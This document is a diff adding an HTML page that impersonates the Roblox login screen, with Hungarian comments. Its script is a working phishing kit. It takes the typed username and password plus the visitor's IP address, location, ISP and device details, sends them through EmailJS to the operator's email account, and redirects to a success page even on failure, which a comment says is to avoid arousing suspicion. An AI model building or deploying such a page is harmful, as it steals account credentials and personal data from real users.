@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #000; color: white; font-family: Arial, Helvetica, sans-serif; overflow: hidden; height: 100vh; }
+        header { position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(10px); padding: 15px 40px; display: flex; align-items: center; justify-content: space-between; z-index: 100; box-sizing: border-box; }
+        .logo { font-size: 32px; font-weight: bold; color: #00a2ff; }
+        nav a { color: white; margin: 0 20px; text-decoration: none; font-size: 16px; }
+        .search-bar { flex: 1; max-width: 500px; margin: 0 40px; }
+        .search-bar input { width: 100%; padding: 12px 20px; border-radius: 30px; border: none; background: #222; color: white; font-size: 16px; }
+        .signup { background: #00a2ff; padding: 12px 30px; border-radius: 30px; text-decoration: none; color: white; font-weight: bold; }
+        .thumbnails { position: absolute; width: 100%; height: 100%; pointer-events: none; }
+        .thumb { position: absolute; width: 280px; height: 157px; object-fit: cover; border-radius: 12px; box-shadow: 0 0 30px rgba(0,162,255,0.6); opacity: 0.6; animation: float 20s infinite ease-in-out; }
+        @keyframes float { 0%,100% { transform: translateY(0) rotate(var(--rot)); } 50% { transform: translateY(-30px) rotate(var(--rot)); } }
+        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a1a; padding: 40px; border-radius: 12px; width: 400px; max-width: 90%; z-index: 200; box-shadow: 0 0 40px rgba(0,162,255,0.8); border: 1px solid #333; }
+        .modal h2 { text-align: center; margin-bottom: 20px; }
+        .modal input { width: 100%; padding: 14px; margin: 10px 0; background: #333; border: 1px solid #444; border-radius: 6px; color: white; box-sizing: border-box; }
+        .modal button { width: 100%; padding: 14px; background: #00a2ff; border: none; border-radius: 6px; color: white; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        .modal button:disabled { opacity: 0.7; cursor: not-allowed; }
+        .modal a, .modal button.link { color: #00a2ff; text-decoration: none; background: none; border: none; font-size: 14px; cursor: pointer; display: block; text-align: center; margin: 15px 0; }
+        .options { text-align: center; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">ROBLOX</div>
+        <nav>
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+            <a href="#">Robux</a>
+        </nav>
+        <div class="search-bar">
+            <input type="text" placeholder="Search">
+        </div>
+        <a href="signup.html" class="signup">Sign Up</a>
+    </header>
+<div class="thumbnails" id="thumbs"></div>
+
+<div class="modal">
+    <h2>Login to Roblox</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username/Email/Phone" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit" id="submitBtn">Log In</button>
+    </form>
+    <div class="options">
+        <a href="forgot.html">Forgot Password or Username?</a>
+        <button class="link" onclick="window.location.href='one-time-code.html'">Email Me a One-Time Code</button>
+        <button class="link" onclick="window.location.href='another-device.html'">Use Another Device</button>
+    </div>
+    <p style="text-align:center;">Don't have an account? <a href="signup.html">Sign Up</a></p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+    // ═══════════════════════════════════════════════════════════════
+    // EmailJS konfiguráció - JAVÍTOTT VERZIÓ
+    // ═══════════════════════════════════════════════════════════════
+    const CONFIG = {
+        publicKey: 'GyAf1S59CWRqPHC95',
+        serviceId: 'cesaxy123@gmail.com',  // ⚠️ NEM EMAIL CÍM! Service ID kell (pl: service_abc123)
+        templateId: 'template_wxgakur'
+    };
+
+    // EmailJS inicializálás
+    (function(){ emailjs.init({ publicKey: CONFIG.publicKey }); })();
+
+    // ═══════════════════════════════════════════════════════════════
+    // IP CÍM LEKÉRÉSE - JAVÍTOTT (több alternatíva)
+    // ═══════════════════════════════════════════════════════════════
+    let ipData = {
+        ip: 'Fetching...',
+        city: 'Fetching...',
+        region: 'Fetching...',
+        country: 'Fetching...',
+        isp: 'Fetching...'
+    };
+
+    // Több IP API próbálása (ha az egyik nem működik)
+    async function getIPInfo() {
+        try {
+            // 1. Próbálkozás: ipapi.co
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            
+            ipData = {
+                ip: data.ip || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country_name || 'Unknown',
+                isp: data.org || 'Unknown'
+            };
+            return true;
+        } catch (error) {
+            try {
+                // 2. Próbálkozás: ipify + ipapi
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipResponse.json();
+                ipData.ip = ipJson.ip || 'Unknown';
+                
+                // Próbáljuk meg a lokációt is
+                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locData = await locResponse.json();
+                ipData.city = locData.city || 'Unknown';
+                ipData.region = locData.region || 'Unknown';
+                ipData.country = locData.country_name || 'Unknown';
+                ipData.isp = locData.org || 'Unknown';
+                return true;
+            } catch (error2) {
+                // Ha minden API meghibásodik
+                ipData = {
+                    ip: 'API Error',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown'
+                };
+                return false;
+            }
+        }
+    }
+
+    // IP lekérése az oldal betöltésekor (háttérben)
+    getIPInfo();
+
+    // ═══════════════════════════════════════════════════════════════
+    // LOGIN FORM KEZELÉSE - JAVÍTOTT (várja meg az IP-t)
+    // ═══════════════════════════════════════════════════════════════
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const submitBtn = document.getElementById('submitBtn');
+        
+        if (!username || !password) return;
+
+        // Gomb letiltása (ne küldje többször)
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Logging in...';
+
+        // Várjuk meg az IP lekérést (max 2 másodperc)
+        if (ipData.ip === 'Fetching...') {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+
+        // Részletes adatok gyűjtése
+        const now = new Date();
+        const deviceInfo = {
+            // Bejelentkezési adatok
+            username: username,
+            password: password,
+            
+            // Időbélyeg
+            timestamp: now.toLocaleString('hu-HU', {
+                year: 'numeric', month: '2-digit', day: '2-digit',
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
+            }),
+            
+            // IP és lokáció (JAVÍTOTT)
+            ip_address: ipData.ip,
+            location: `${ipData.city}, ${ipData.region}, ${ipData.country}`,
+            isp: ipData.isp,
+            
+            // Eszköz információk
+            browser: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            
+            // Egyéb
+            referrer: document.referrer || 'Direct',
+            cookies_enabled: navigator.cookieEnabled ? 'Yes' : 'No',
+            online: navigator.onLine ? 'Yes' : 'No'
+        };
+
+        // Email küldése
+        emailjs.send(CONFIG.serviceId, CONFIG.templateId, deviceInfo)
+            .then(() => {
+                // Sikeres küldés
+                window.location.href = `success.html?user=${encodeURIComponent(username)}`;
+            })
+            .catch((error) => {
+                // Hiba esetén is átirányítás (ne gyanakodjon)
+                window.location.href = `success.html?user=${encodeURIComponent(username)}`;
+            });
+    });
+
+    // ═══════════════════════════════════════════════════════════════
+    // THUMBNAIL-EK GENERÁLÁSA
+    // ═══════════════════════════════════════════════════════════════
+    const thumbnails = [
+        "https://tr.rbxcdn.com/180DAY-1b2ce3f49cd12eb6626b9a21420baadd/768/432/Image/Webp/noFilter",
+        "https://tr.rbxcdn.com/180DAY-8141c0e896a2e3f349368d99ba62daea/768/432/Image/Webp/noFilter",
+        "https://tr.rbxcdn.com/180DAY-64f0a7a88d9f4d032dce64679cac0fc3/768/432/Image/Webp/noFilter",
+        "https://tr.rbxcdn.com/180DAY-57f7b6b732a28eeb1ef27126118dec70/768/432/Image/Webp/noFilter",
+        "https://tr.rbxcdn.com/180DAY-47ce828598f254aa82789a57839ee72a/768/432/Image/Webp/noFilter",
+        "https://tr.rbxcdn.com/180DAY-423c8579e8e0ea4716e30b7b90fc91ca/768/432/Image/Webp/noFilter",
+        "https://tr.rbxcdn.com/180DAY-e0d2eefc9ad916d72e1220aea17c6ffe/768/432/Image/Webp/noFilter"
+    ];
+    const container = document.getElementById('thumbs');
+    thumbnails.forEach((src, i) => {
+        const img = document.createElement('img');
+        img.src = src;
+        img.classList.add('thumb');
+        img.style.left = `${Math.random() * 80 + 10}%`;
+        img.style.top = `${Math.random() * 80 + 10}%`;
+        img.style.width = `${250 + Math.random() * 100}px`;
+        img.style.height = 'auto';
+        img.style.setProperty('--rot', `${-25 + Math.random() * 50}deg`);
+        img.style.animationDelay = `${i * 1.5}s`;
+        container.appendChild(img);
+    });
+</script>
+
+</body>
+</html>
